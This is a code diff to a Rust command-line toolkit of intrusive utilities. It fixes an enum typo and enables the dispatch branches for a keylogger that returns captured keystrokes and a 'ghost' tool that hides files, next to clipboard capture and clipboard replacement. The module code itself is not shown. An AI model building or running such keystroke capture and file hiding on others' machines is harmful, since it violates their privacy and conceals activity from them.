@@ -15,7 +15,7 @@ fn check_tool(input: &str) -> Tool {
         "replaceboard" => return Tool::ReplaceBoard,
         "ghost" => return Tool::Ghost,
         "mouseketool" => return Tool::Mouseketool,
-        "obfuscate" => return Tool::Obufscate,
+        "obfuscate" => return Tool::Obfuscate,
         _ => return Tool::Invalid, 
     }
 }
@@ -99,9 +99,10 @@ Use --list to see a list of available tools")
 
 pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
     match tool {
-        // Tool::Keylogger => {
-        //     let _ = keylogger::run();
-        // }
+        Tool::Keylogger => {
+            let captured = keylogger::run()?;
+            Ok(captured)
+        }
         Tool::Clipboard => {
             let text = clipboard::run()?;
             Ok(text)
@@ -110,14 +111,15 @@ pub fn run(tool: Tool) -> Result<String, Box<dyn Error>> {
             let _ = replaceboard::run()?;
             Ok(String::from("Replaced clipboard with text \'1337\'"))
         }
-        // Tool::Ghost => {
-        //     let _ = ghost::run()?;
-        // }
         Tool::Mouseketool => {
             let _ = mouseketool::run()?;
             Ok(String::from("Moved the mouse"))
         } 
-        // Tool::Obufscate => {
+        Tool::Ghost => {
+            let _ = ghost::run()?;
+            Ok(String::from("Hid files"))
+        }
+        // Tool::Obfuscate => {
         //     let filename = get_filename()?;
         //     let _ = obfuscate::run(filename)?;
         //     return Ok(())
